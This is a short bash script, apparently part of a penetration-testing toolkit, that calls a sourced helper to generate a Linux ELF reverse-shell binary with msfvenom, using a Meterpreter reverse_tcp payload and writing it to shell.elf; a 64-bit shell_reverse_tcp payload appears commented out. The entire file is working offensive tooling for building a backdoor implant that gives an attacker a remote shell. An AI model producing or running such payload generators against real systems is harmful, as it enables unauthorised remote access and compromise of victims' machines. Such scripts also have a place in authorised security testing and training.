#!/bin/bash

: '
Create ELF file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

# payload="linux/x64/shell_reverse_tcp "
payload="linux/x86/meterpreter/reverse_tcp"
format="elf"
filename="shell.elf"

create_reverse_shell "${payload}" "${format}" "${filename}"
